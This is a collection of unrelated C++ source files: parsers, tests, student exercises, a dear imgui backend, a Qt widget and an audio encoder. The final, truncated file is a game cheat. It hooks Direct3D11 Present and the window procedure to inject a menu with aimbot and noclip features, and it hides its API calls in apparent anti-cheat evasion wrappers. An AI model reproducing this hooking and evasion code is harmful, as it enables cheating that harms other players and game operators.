tokenToOperator(*tokenG->_group.begin()),\n                                                    tokenToOperator(*tokenG->_group.rbegin()));\n        case TokenType::devision_gr:\n            return std::make_shared<BinaryOperator>((*(++(tokenG->_group.begin())))->_type, tokenToOperator(*tokenG->_group.begin()),\n                                                    tokenToOperator(*tokenG->_group.rbegin()));\n        case TokenType::plus_gr:\n            return std::make_shared<BinaryOperator>((*(++(tokenG->_group.begin())))->_type, tokenToOperator(*tokenG->_group.begin()),\n                                                    tokenToOperator(*tokenG->_group.rbegin()));\n        case TokenType::minus_gr:\n            return std::make_shared<BinaryOperator>((*(++(tokenG->_group.begin())))->_type, tokenToOperator(*tokenG->_group.begin()),\n                                                    tokenToOperator(*tokenG->_group.rbegin()));\n        default:\n            throw std::runtime_error(\"Parser error.\");\n        }\n    }\n\n    throw std::runtime_error(\"Undefined token: \" + std::to_string(static_cast<int>(token->_type)));\n}\n\nOperatorPtr operator+(OperatorPtr left, OperatorPtr right)\n{\n    return std::make_shared<BinaryOperator>(TokenType::plus, left, right);\n}\n\nOperatorPtr operator-(OperatorPtr left, OperatorPtr right)\n{\n    return std::make_shared<BinaryOperator>(TokenType::minus, left, right);\n}\n\nOperatorPtr operator*(OperatorPtr left, OperatorPtr right)\n{\n    if(left->isNearOne())\n        return right;\n    if(right->isNearOne())\n        return left;\n\n    return std::make_shared<BinaryOperator>(TokenType::multipl, left, right);\n}\n\nOperatorPtr operator^(OperatorPtr left, OperatorPtr right)\n{\n    if(right->isNearOne())\n        return left;\n\n    return std::make_shared<BinaryOperator>(TokenType::ext, left, right);\n}\n\nOperatorPtr operator/(OperatorPtr left, OperatorPtr right)\n{\n    return std::make_shared<BinaryOperator>(TokenType::devision, left, right);\n}\n\n}\n",
    "// Trainboard.ch\n// Copyright (C) 2024 Emile D\u00e9costerd\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\n#include \"gtest/gtest.h\"\n\n#include \"DataManager.h\"\n#include \"DataManagerTypes.h\"\n#include \"FakeData.h\"\n#include \"FwConfig.h\"\n\n#include <array>\n\nclass DataMgrFakeStoreTest : public ::testing::Test\n{\n  protected:\n    DataReader* reader_;\n    void SetUp() override\n    {\n        DataMgr_Reset();\n        DataMgr_SetReaderMode(DataReaderMode::kOffline);\n        reader_ = DataMgr_GetReader();\n        ASSERT_NE(reader_, nullptr);\n    }\n};\n\nTEST_F(DataMgrFakeStoreTest, Reader_DataNullptr_ReturnZero)\n{\n    EXPECT_EQ(reader_->ReadData(nullptr, 42U), 0U);\n}\n\nTEST_F(DataMgrFakeStoreTest, Reader_LengthZero_ReturnZero)\n{\n    std::array<uint8_t, 42U> buffer;\n    EXPECT_EQ(reader_->ReadData(buffer.data(), 0U), 0U);\n}\n\nTEST_F(DataMgrFakeStoreTest, CircularReadThroughFakeData_EnsureCircularBehaviour)\n{\n    for (auto i = 0; i < kNumberOfFakeFrames + 5U; i++)\n    {\n        Frame read_frame{};\n        const auto read_length = reader_->ReadData(read_frame.data, kBufferSizeInBytes);\n\n        EXPECT_EQ(read_length, g_fake_data[i % kNumberOfHistoryFrames].length);\n        for (auto j = 0; j < read_length; j++)\n        {\n            ASSERT_EQ(read_frame.data[j], g_fake_data[i % kNumberOfHistoryFrames].data[j]);\n        }\n    }\n}\n",
    "\n//Assignment 2 - Rectangle Area\n#include <iostream>\n#include <conio.h>\n\nusing namespace std;\n\n//Function prototypes\ndouble GetLengthFromUser();\ndouble GetWidthFromUser();\ndouble CalculateArea(double length, double width);\nvoid DisplayArea(double area);\n\nint main()\n{\n\tdouble length = GetLengthFromUser();\n\tdouble width = GetWidthFromUser(); \n\tdouble area;\n\t\n\t//Calculate the area\n\tarea = CalculateArea(length,width);\n\t\n\t//Display the total area\n\tDisplayArea(area);\n\n\t(void)_getch();\n\treturn 0;\n}\n\n\n//User to enter the length \ndouble GetLengthFromUser()\n{\n\tdouble length = 0;\n\tcout << \"Enter the length of the rectangle: \";\n\tcin >> length;\n\treturn length; \n}\n\n//User to enter the width\ndouble GetWidthFromUser()\n{\n\tdouble width = 0;\n\tcout << \"Enter the width of the rectangle: \";\n\tcin >> width;\n\treturn width; \n}\n\n//Calculate the length and width together\ndouble CalculateArea(double length, double width)\n{\n\treturn length * width;\n}\n\n// Display the total area\nvoid DisplayArea(double area)\n{\n\tcout << \"The area of the rectangle is: \" << area << endl;\n}\n",
    "// dear imgui: Platform Backend for Windows (standard windows API for 32 and 64 bits applications)\n// This needs to be used along with a Renderer (e.g. DirectX11, OpenGL3, Vulkan..)\n\n// Implemented features:\n//  [X] Platform: Clipboard support (for Win32 this is actually part of core dear imgui)\n//  [X] Platform: Mouse cursor shape and visibility. Disable with 'io.ConfigFlags |= ImGuiConfigFlags_NoMouseCursorChange'.\n//  [X] Platform: Keyboard arrays indexed using VK_* Virtual Key Codes, e.g. ImGui::IsKeyPressed(VK_SPACE).\n//  [X] Platform: Gamepad support. Enabled with 'io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad'.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// If you are new to Dear ImGui, read documentation from the docs/ folder + read the top of imgui.cpp.\n// Read online: https://github.com/ocornut/imgui/tree/master/docs\n\n#include \"imgui.h\"\n#include \"imgui_impl_win32.h\"\n#ifndef WIN32_LEAN_AND_MEAN\n#define WIN32_LEAN_AND_MEAN\n#endif\n#include <windows.h>\n#include <tchar.h>\n#include <dwmapi.h>\n\n// Configuration flags to add in your imconfig.h file:\n//#define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD              // Disable gamepad support. This was meaningful before <1.81 but we now load XInput dynamically so the option is now less relevant.\n\n// Using XInput for gamepad (will load DLL dynamically)\n#ifndef IMGUI_IMPL_WIN32_DISABLE_GAMEPAD\n#include <xinput.h>\ntypedef DWORD (WINAPI *PFN_XInputGetCapabilities)(DWORD, DWORD, XINPUT_CAPABILITIES*);\ntypedef DWORD (WINAPI *PFN_XInputGetState)(DWORD, XINPUT_STATE*);\n#endif\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2021-08-17: Calling io.AddFocusEvent() on WM_SETFOCUS/WM_KILLFOCUS messages.\n//  2021-08-02: Inputs: Fixed keyboard modifiers being reported when host windo doesn't have focus.\n//  2021-07-29: Inputs: MousePos is correctly reported when the host platform window is hovered but not focused (using TrackMouseEvent() to receive WM_MOUSELEAVE events).\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-08: Fixed ImGui_ImplWin32_EnableDpiAwareness() and ImGui_ImplWin32_GetDpiScaleForMonitor() to handle Windows 8.1/10 features without a manifest (per-monitor DPI, and properly calls SetProcessDpiAwareness() on 8.1).\n//  2021-03-23: Inputs: Clearing keyboard down array when losing focus (WM_KILLFOCUS).\n//  2021-02-18: Added ImGui_ImplWin32_EnableAlphaCompositing(). Non Visual Studio users will need to link with dwmapi.lib (MinGW/gcc: use -ldwmapi).\n//  2021-02-17: Fixed ImGui_ImplWin32_EnableDpiAwareness() attempting to get SetProcessDpiAwareness from shcore.dll on Windows 8 whereas it is only supported on Windows 8.1.\n//  2021-01-25: Inputs: Dynamically loading XInput DLL.\n//  2020-12-04: Misc: Fixed setting of io.DisplaySize to invalid/uninitialized data when after hwnd has been closed.\n//  2020-03-03: Inputs: Calling AddInputCharacterUTF16() to support surrogate pairs leading to codepoint >= 0x10000 (for more complete CJK inputs)\n//  2020-02-17: Added ImGui_ImplWin32_EnableDpiAwareness(), ImGui_ImplWin32_GetDpiScaleForHwnd(), ImGui_ImplWin32_GetDpiScaleForMonitor() helper functions.\n//  2020-01-14: Inputs: Added support for #define IMGUI_IMPL_WIN32_DISABLE_GAMEPAD/IMGUI_IMPL_WIN32_DISABLE_LINKING_XINPUT.\n//  2019-12-05: Inputs: Added support for ImGuiMouseCursor_NotAllowed mouse cursor.\n//  2019-05-11: Inputs: Don't filter value from WM_CHAR before calling AddInputCharacter().\n//  2019-01-17: Misc: Using GetForegroundWindow()+IsChild() instead of GetActiveWindow() to be compatible with windows created in a different thread or parent.\n//  2019-01-17: Inputs: Added support for mouse buttons 4 and 5 via WM_XBUTTON* messages.\n//  2019-01-15: Inputs: Added support for XInput gamepads (if ImGuiConfigFlags_NavEnableGamepad is set by user application).\n//  2018-11-30: Misc: Setting up io.BackendPlatformName so it can be displayed in the About Window.\n//  2018-06-29: Inputs: Added support for the ImGuiMouseCursor_Hand cursor.\n//  2018-06-10: Inputs: Fixed handling of mouse wheel messages to support fine position messages (typically sent by track-pads).\n//  2018-06-08: Misc: Extracted imgui_impl_win32.cpp/.h away from the old combined DX9/DX10/DX11/DX12 examples.\n//  2018-03-20: Misc: Setup io.BackendFlags ImGuiBackendFlags_HasMouseCursors and ImGuiBackendFlags_HasSetMousePos flags + honor ImGuiConfigFlags_NoMouseCursorChange flag.\n//  2018-02-20: Inputs: Added support for mouse cursors (ImGui::GetMouseCursor() value and WM_SETCURSOR message handling).\n//  2018-02-06: Inputs: Added mapping for ImGuiKey_Space.\n//  2018-02-06: Inputs: Honoring the io.WantSetMousePos by repositioning the mouse (when ",
    "#include \"lattice.h\"\n\nLattice::Lattice(QWidget *parent)\n    : QWidget{parent}\n{\n    unitLabel = nullptr;\n}\n\nLattice::~Lattice()\n{\n}\n\nbool Lattice::findFilePathFromDrop(QDropEvent *event, QString &filePath)\n{\n    QList<QUrl> urls = event->mimeData()->urls();\n    if(urls.size() != 1)\n    {\n        qDebug() << \"url number = \" << urls.size() << \" != 1, error!\";\n        return false;\n    }\n\n    for(QUrl url : urls)\n        filePath = url.toLocalFile();\n\n    return true;\n}\n\nbool Lattice::findIconFromPath(QString filePath, QPixmap &unitIcon)\n{\n    if(filePath.isEmpty())\n    {\n        qDebug() << \"filePath is empty, error!\";\n        return false;\n    }\n\n    QFileInfo fileInfo(filePath);\n    QFileIconProvider iconProvider;\n    QIcon icon = iconProvider.icon(fileInfo);\n\n    unitIcon = icon.pixmap(icon.actualSize(QSize(64, 64)));\n    return true;\n}\n\nbool Lattice::loadDataFromUserIcon(QDropEvent *event)\n{\n    if(unitLabel == nullptr)\n    {\n        qDebug() << \"no unit label when load data from icon\";\n        return false;\n    }\n\n    QString path;\n    QPixmap pixmap;\n    if(findFilePathFromDrop(event, path) == false)\n    {\n        qDebug() << \"error: get file path failed!\";\n    }\n    else if(findIconFromPath(path, pixmap) == false)\n    {\n        qDebug() << \"error: set icon to unit failed!\";\n    }\n    else\n    {\n        qDebug() << \"load data from icon success!\";\n        unitLabel->setFilePath(path);\n        unitLabel->setUnitIcon(pixmap);\n        return true;\n    }\n\n    return false;\n}\n\n\nvoid Lattice::paintEvent(QPaintEvent *event)\n{\n    QPainter p(this);\n    p.setPen(QColor(\"black\")); //\u8bbe\u7f6e\u753b\u7b14\u8bb0\u989c\u8272\n    p.drawRect(0, 0, width() -1, height() -1); //\u7ed8\u5236\u8fb9\u6846\n}\n\nvoid Lattice::dragEnterEvent(QDragEnterEvent *event) {\n    qDebug() << \"enter dragEnterEvent of lattice\";\n    if(unitLabel != nullptr)\n    {\n        qDebug() << \"this lattic has label, ignore this drop action\";\n        event->ignore();\n        return;\n    }\n    event->acceptProposedAction();\n}\n\nvoid Lattice::dropEvent(QDropEvent *event)\n{\n    if (event->mimeData()->hasFormat(\"application/x-dnditemdata\"))\n    {\n        qDebug() << \"get data from drag in dropEvent\";\n        QByteArray itemData = event->mimeData()->data(\"application/x-dnditemdata\");\n        QDataStream dataStream(&itemData, QIODevice::ReadOnly);\n\n        QPixmap pixmap;\n        QString filePath;\n        dataStream >> pixmap >> filePath;\n\n        unitLabel = new UnitBox(this);\n        unitLabel->setFilePath(filePath);\n        unitLabel->setUnitIcon(pixmap);\n        unitLabel->setAttribute(Qt::WA_DeleteOnClose);\n        unitLabel->show();\n    }\n    else\n    {\n        qDebug() << \"get data from userIcon in dropEvent\";\n        unitLabel = new UnitBox(this);\n        loadDataFromUserIcon(event);\n        unitLabel->setAttribute(Qt::WA_DeleteOnClose);\n        unitLabel->show();\n    }\n\n    event->acceptProposedAction();\n\n}\n\nvoid Lattice::mousePressEvent(QMouseEvent *event)\n{\n    qDebug() << \"mouse Press\";\n\n    QLabel *child = static_cast<QLabel*>(childAt(event->position().toPoint()));\n    if (!child)\n        return;\n\n    QDrag *drag = new QDrag(this);\n\n    QByteArray itemData;\n    QPixmap pixmap = unitLabel->getUnitIcon();\n    QString filePath = unitLabel->getFilePath();\n    QDataStream dataStream(&itemData, QIODevice::WriteOnly);\n    dataStream << pixmap << filePath;\n\n    QMimeData *mimeData = new QMimeData();\n    mimeData->setData(\"application/x-dnditemdata\", itemData);\n\n    drag->setMimeData(mimeData);\n    drag->setPixmap(pixmap);\n    drag->setHotSpot(event->position().toPoint() - child->pos());\n\n    if(drag->exec(Qt::MoveAction, Qt::MoveAction) == Qt::MoveAction)\n    {\n        unitLabel->close();\n        unitLabel = nullptr;\n\n    }\n}\n",
    "/*\n  ISC License\n\n  Copyright (c) 2024, Antonio SJ Musumeci <trapexit@spawn.link>\n\n  Permission to use, copy, modify, and/or distribute this software for any\n  purpose with or without fee is hereby granted, provided that the above\n  copyright notice and this permission notice appear in all copies.\n\n  THE SOFTWARE IS PROVIDED \"AS IS\" AND THE AUTHOR DISCLAIMS ALL WARRANTIES\n  WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF\n  MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR\n  ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES\n  WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN\n  ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF\n  OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.\n*/\n\n#include \"subcmd_to_adp4.hpp\"\n\n#include \"fmt.hpp\"\n#include \"intel_dvi_encode.h\"\n#include \"options.hpp\"\n#include \"types_ints.h\"\n\n#include <vector>\n\n#include <cstdio>\n\nnamespace l\n{\n  static\n  u32\n  file_size(FILE *f_)\n  {\n    long orig_off;\n    long size;\n\n    orig_off = ftell(f_);\n    fseek(f_,0,SEEK_END);\n    size = ftell(f_);\n    fseek(f_,orig_off,SEEK_SET);\n\n    return size;\n  }\n  \n  void\n  to_adp4(const std::filesystem::path &filepath_)\n  {\n    FILE *in_file;\n    FILE *out_file;\n    IntelDVIEncodeState state = {0};\n    std::vector<s16> input_data;\n    std::vector<u8> output_data;\n    u32  sample_count;\n\n    in_file  = fopen(filepath_.string().c_str(),\"rb\");\n    out_file = fopen(\"adp4.test.raw\",\"wb\");\n\n    sample_count = l::file_size(in_file);\n    sample_count >>= 1;\n\n    input_data.resize(sample_count);\n    output_data.resize(sample_count >> 1); // 4bits per sample, 2\n                                           // samples per byte\n    // Pad to word / 4 byte alignment for use with 3DO\n    // https://3dodev.com/documentation/development/opera/pf25/ppgfldr/mgsfldr/mprfldr/01mpr021\n    output_data.resize(((output_data.size() + 3) / 4) * 4);\n\n    fread(&input_data[0],\n          sizeof(s16),\n          input_data.size(),\n          in_file);\n    \n    intel_dvi_encode2(&state,\n                     input_data.data(),\n                     input_data.size(),\n                     output_data.data());\n\n    fwrite(&output_data[0],\n           sizeof(u8),\n           output_data.size(),\n           out_file);\n\n    fclose(out_file);\n    fclose(in_file);\n  }\n}\n\nvoid\nSubCmd::to_adp4(const Opts::ToADP4 &opts_)\n{\n  for(auto &filepath : opts_.filepaths)\n    l::to_adp4(filepath);\n}\n",
    "\ufeff\n#include <iostream>\n#include <conio.h>\n\nint main()\n{\n    //task1 \n\n    /*\n    const int Hight = 5;\n    const int Wight = 5;\n    int massiv[Hight][Wight];\n    int sum = 0;\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Wight; ++y)\n        {\n            massiv[i][y] = rand() % 20;\n            std::cout << massiv[i][y] << \" \";\n            sum += massiv[i][y];\n        }\n        std::cout << \"\\n\";\n    }\n    std::cout << \"Suma \" << sum;\n    std::cout << \"Crednie \" << sum / 20;\n    */\n\n    //task2\n\n    /*\n    const int Hight = 5;\n    int massiv[Hight][Hight];\n    int sum = 0;\n    int sumSecond = 0;\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Hight; ++y)\n        {\n            massiv[i][y] = rand() % 20;\n            std::cout << massiv[i][y] << \" \";\n        }\n        std::cout << \"\\n\";\n    }\n\n    for (int x = 0; x < Hight;++x)\n    {\n        sum += massiv[x][x];\n        sumSecond += massiv[x][Hight - x - 1];\n    }\n    std::cout << \"Suma \" << sum;\n    std::cout << \"Suma second \" << sumSecond;\n    */\n\n    //task3\n\n    /*\n    const int Hight = 5;\n    const int Wight = 5;\n    int massiv[Hight][Wight];\n    int countNegativ = 0;\n    int countPositiv = 0;\n    int countZero = 0;\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Wight; ++y)\n        {\n            massiv[i][y] = rand() % 20 - 10;\n            std::cout << massiv[i][y] << \" \";\n            if (massiv[i][y] == 0)\n            {\n                ++countZero;\n            }\n            else if (massiv[i][y] >0)\n            {\n                ++countPositiv;\n            }\n            else\n            {\n                ++countNegativ;\n            }\n        }\n        std::cout << \"\\n\";\n    }\n    std::cout << \"Negativ \" << countNegativ;\n    std::cout << \"Positiv \" << countPositiv;\n    std::cout << \"Zero \" << countZero;\n    */\n\n    //task4\n\n    /*\n    const int Hight = 5;\n    const int Wight = 5;\n    int massiv[Hight][Wight];\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Wight; ++y)\n        {\n            massiv[i][y] = rand() % 20;\n            std::cout << massiv[i][y] << \" \";\n        }\n        std::cout << \"\\n\";\n    }\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        int sum = 0;\n        for (int y = 0; y < Wight; ++y)\n        {\n            sum += massiv[i][y];\n        }\n        std::cout << \"Ctroka \" << i+1 << \" \" << sum;\n    }\n\n    for (int i = 0; i < Wight; ++i)\n    {\n        int sum = 0;\n        for (int y = 0; y < Hight; ++y)\n        {\n            sum += massiv[y][i];\n        }\n        std::cout << \"Stolbec \" << i + 1 << \" \" << sum;\n    }\n    */\n\n    //task5\n    \n    /*\n    const int Hight = 5;\n    const int Wight = 5;\n    int massiv[Hight][Wight];\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Wight; ++y)\n        {\n            massiv[i][y] =10*i+y;\n            std::cout << massiv[i][y] << \" \";\n        }\n        std::cout << \"\\n\";\n    }\n    */\n\n    //task9\n\n    /*\n    const int Hight = 5;\n    const int Wight = 6;\n    int massiv[Hight][Wight];\n    int number = 1;\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Wight; ++y)\n        {\n            massiv[i][y] = number;\n            std::cout << massiv[i][y] << \" \";\n            ++number;\n        }\n        std::cout << \"\\n\";\n    }\n    */\n\n    //task10\n\n    // \u0423 \u043c\u0435\u043d\u044f \u0442\u0443\u0442 \u043d\u0435 \u0441\u043e\u0441\u0432\u0441\u0435\u043c\u043f\u043e\u043b\u0443\u0447\u0438\u043b\u043e\u0441\u044c. \u0418 \u044f \u043d\u0435 \u043f\u043e\u043d\u0438\u043c\u0430\u044e \u043f\u043e\u0447\u0438\u043c\u0443 \u0432 \u043b\u043e\u0433\u0438\u043a\u0435 \u0432\u0440\u043e\u0434\u0435 \u0432\u0441\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\n    // \u041d\u043e \u0432\u044b\u0445\u043e\u0434\u0438\u0442 \n    // 1 2 3 4 5 6\n    //13 12 11 10 9 8\n    //13 14 15 16 17 18\n    //25 24 23 22 21 20\n    //25 26 27 28 29 30\n    const int Hight = 5;\n    const int Wight = 6;\n    int massiv[Hight][Wight];\n    int number = 1;\n\n    for (int i = 0; i < Hight; ++i)\n    {\n        for (int y = 0; y < Wight; ++y)\n        {\n            if (i % 2 == 0)\n            {\n                massiv[i][y] = number;\n                std::cout << massiv[i][y] << \" \";\n                ++number;\n            }\n            else\n            {\n                massiv[i][y] = number;\n                std::cout << massiv[i][y] << \" \";\n                --number;\n            }\n        }\n        std::cout << \"\\n\";\n        number += 6;\n    }\n}\n",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\ntypedef vector<vector<int>> Matrix;\n\n// Function to add two matrices\nMatrix add(const Matrix &A, const Matrix &B, int size) {\n    Matrix result(size, vector<int>(size));\n    for (int i = 0; i < size; i++)\n        for (int j = 0; j < size; j++)\n            result[i][j] = A[i][j] + B[i][j];\n    return result;\n}\n\n// Function to split the matrix into four submatrices\nvoid splitMatrix(const Matrix &A, Matrix &A11, Matrix &A12, Matrix &A21, Matrix &A22, int mid) {\n    for (int i = 0; i < mid; i++) {\n        for (int j = 0; j < mid; j++) {\n            A11[i][j] = A[i][j];                // Top-left\n            A12[i][j] = A[i][j + mid];          // Top-right\n            A21[i][j] = A[i + mid][j];          // Bottom-left\n            A22[i][j] = A[i + mid][j + mid];    // Bottom-right\n        }\n    }\n}\n\n// Function to combine four submatrices into one result matrix\nvoid combineMatrix(Matrix &C, const Matrix &C11, const Matrix &C12, const Matrix &C21, const Matrix &C22, int mid) {\n    for (int i = 0; i < mid; i++) {\n        for (int j = 0; j < mid; j++) {\n            C[i][j] = C11[i][j];                 // Top-left\n            C[i][j + mid] = C12[i][j];           // Top-right\n            C[i + mid][j] = C21[i][j];           // Bottom-left\n            C[i + mid][j + mid] = C22[i][j];     // Bottom-right\n        }\n    }\n}\n\n// Divide and conquer matrix multiplication\nMatrix MM(const Matrix &A, const Matrix &B, int n) {\n    Matrix C(n, vector<int>(n, 0));\n    \n    if (n == 1) {\n        // Base case: simple multiplication when the matrix is 1x1\n        C[0][0] = A[0][0] * B[0][0];\n        return C;\n    } else {\n        int mid = n / 2;\n\n        // Initialize submatrices\n        Matrix A11(mid, vector<int>(mid));\n        Matrix A12(mid, vector<int>(mid));\n        Matrix A21(mid, vector<int>(mid));\n        Matrix A22(mid, vector<int>(mid));\n\n        Matrix B11(mid, vector<int>(mid));\n        Matrix B12(mid, vector<int>(mid));\n        Matrix B21(mid, vector<int>(mid));\n        Matrix B22(mid, vector<int>(mid));\n\n        // Split A and B into 4 submatrices each\n        splitMatrix(A, A11, A12, A21, A22, mid);\n        splitMatrix(B, B11, B12, B21, B22, mid);\n\n        // Recursively calculate the submatrices of the result matrix\n        Matrix C11 = add(MM(A11, B11, mid), MM(A12, B21, mid), mid);\n        Matrix C12 = add(MM(A11, B12, mid), MM(A12, B22, mid), mid);\n        Matrix C21 = add(MM(A21, B11, mid), MM(A22, B21, mid), mid);\n        Matrix C22 = add(MM(A21, B12, mid), MM(A22, B22, mid), mid);\n\n        // Combine the submatrices into the result matrix\n        combineMatrix(C, C11, C12, C21, C22, mid);\n\n        return C;\n    }\n}\n\nint main() {\n    int n = 4; // Size of the matrix (must be a power of 2 for simplicity)\n    \n    Matrix A = {\n        {1, 2, 3, 4},\n        {5, 6, 7, 8},\n        {9, 10, 11, 12},\n        {13, 14, 15, 16}\n    };\n\n    Matrix B = {\n        {1, 2, 3, 4},\n        {5, 6, 7, 8},\n        {9, 10, 11, 12},\n        {13, 14, 15, 16}\n    };\n\n    Matrix result = MM(A, B, n);\n\n    cout << \"Result matrix:\\n\";\n    for (int i = 0; i < n; i++) {\n        for (int j = 0; j < n; j++)\n            cout << result[i][j] << \" \";\n        cout << \"\\n\";\n    }\n\n    return 0;\n}\n",
    "#include \"Core.hpp\"\r\n\r\n#include \"d3d_Hook.hpp\"\r\n#include \"Menu.hpp\"\r\n#include \"Classes.hpp\"\r\n#include \"Settings.hpp\"\r\n#include \"Visuals.hpp\"\r\n#include \"Player.hpp\"\r\n#include \"Aimbot.hpp\"\r\n#include \"Weapon.hpp\"\r\n#include \"NoClip.hpp\"\r\n#include \"vehicule.hpp\"\r\n#include \"auth.hpp\"\r\n#include \"Fonts.hpp\"\r\n#include <imguinotify.hpp>\r\n#include <program.hpp>\r\n\r\n#pragma comment(lib, \"proxine.lib\")\r\n\r\n//#include \"Snow.hpp\"\r\nextern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\n// you need those for snowflake\r\n#define WINDOW_WIDTH  1920\r\n#define WINDOW_HEIGHT 1080\r\nbool IsValid = false;\r\n\r\nvoid Kouloumbou()\r\n{\r\n\tstd::exit(-1);\r\n}\r\nvoid InitImGui()\r\n{\r\n\tusing namespace DirectX;\r\n\r\n\tImGui::CreateContext();\r\n\r\n\tImGuiIO* io = &ImGui::GetIO();\r\n\tio->ConfigFlags = ImGuiConfigFlags_NoMouseCursorChange;\r\n\tio->IniFilename = nullptr;\r\n\tio->LogFilename = nullptr;\r\n\r\n\tstatic const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_FA, 0 };\r\n\tImFontConfig icons_config;\r\n\r\n\ticons_config.MergeMode = true;\r\n\ticons_config.PixelSnapH = true;\r\n\t\r\n\tImFontConfig rubik;\r\n\trubik.FontDataOwnedByAtlas = false;\r\n\t\r\n\r\n\tio->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 15.5f, &rubik);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tio->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 25.f, &icons_config, icons_ranges);\r\n\tMenu::BiggestIcon = io->Fonts->AddFontFromMemoryCompressedTTF(font_awesome_data, font_awesome_size, 40.f, NULL, icons_ranges);\r\n\tMenu::BiggestFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 21.f, &rubik);\r\n\tMenu::littleFont = io->Fonts->AddFontFromMemoryTTF(const_cast<uint8_t*>(Rubik), sizeof(Rubik), 17.5f, &rubik);\r\n\r\n\tImGui_ImplWin32_Init(Window);\r\n\tImGui_ImplDX11_Init(pDevice, pContext);\r\n\t\r\n\t//Snowflake::CreateSnowFlakes(snow, SNOW_LIMIT, 5.f/*minimum size*/, 25.f/*maximum size*/, 0/*imgui window x position*/, 0/*imgui window y position*/, WINDOW_WIDTH, WINDOW_HEIGHT, Snowflake::vec3(0.f, 0.005f)/*gravity*/, IM_COL32(255,255, 255, 100)/*color*/);\r\n\r\n}\r\n\r\n\r\nLRESULT __stdcall WindowHandler(const HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)\r\n{\r\n\tif (Menu::Open)\r\n\t{\r\n\t\tImGui_ImplWin32_WndProcHandler(hWnd, uMsg, wParam, lParam);\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn SAFE_CALL(CallWindowProcA)(DirectX::WindowEx, hWnd, uMsg, wParam, lParam);\r\n}\r\n\r\n\r\nbool BindD3DInfo(IDXGISwapChain* pSwapChain)\r\n{\r\n\tif (SUCCEEDED(pSwapChain->GetDevice(__uuidof(ID3D11Device), (void**)&DirectX::pDevice)))\r\n\t{\r\n\t\tDirectX::pDevice->GetImmediateContext(&DirectX::pContext);\r\n\t\tDXGI_SWAP_CHAIN_DESC sd;\r\n\r\n\t\tpSwapChain->GetDesc(&sd);\r\n\t\tDirectX::Window = sd.OutputWindow;\r\n\t\t\r\n\t\r\n\t\tID3D11Texture2D* pBackBuffer;\r\n\r\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&pBackBuffer);\r\n\t\tDirectX::pDevice->CreateRenderTargetView(pBackBuffer, 0, &DirectX::renderTargetView);\r\n\t\tpBackBuffer->Release();\r\n\r\n\t\tDirectX::WindowEx = (WNDPROC)LI_FN(SetWindowLongPtrA).safe_cached()(DirectX::Window, GWLP_WNDPROC, (LONG_PTR)WindowHandler);\r\n\r\n\t\tInitImGui();\r\n\r\n\t\tMenu::FirstTime = false;\r\n\r\n\t\tMenu::Style();\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\nbool AuthConnected = false;\r\n\r\nchar Licence[50] = \"\";\r\nchar UserName[20] = \"\";\r\nchar RgPassWord[20] = \"\";\r\nchar RgUserName[20] = \"\";\r\nstatic int Tabs = 2;\r\nstatic int Checks = 0;\r\nHRESULT __stdcall PresentHook(IDXGISwapChain* pSwapChain, UINT SyncInterval, UINT Flags)\r\n{\r\n\tif (Menu::FirstTime)\r\n\t{\r\n\r\n\t\tif (!BindD3DInfo(pSwapChain))\r\n\t\t\treturn DirectX::OriginalPresent(pSwapChain, SyncInterval, Flags);\r\n\t}\r\n\r\n\tImGui_ImplDX11_NewFrame();\r\n\tImGui_ImplWin32_NewFrame();\r\n\tImGui::NewFrame();\r\n\r\n\tif (SAFE_CALL(GetAsyncKeyState)(VK_INSERT) & 1)\r\n\t{\r\n\r\n\t\tMenu::Open = !Menu::Open;\r\n\t}\r\n\tif (SAFE_CALL(GetAsyncKeyState)(0x58) & 1)\r\n\t{\r\n\t\tSettings::Player::NoClip = 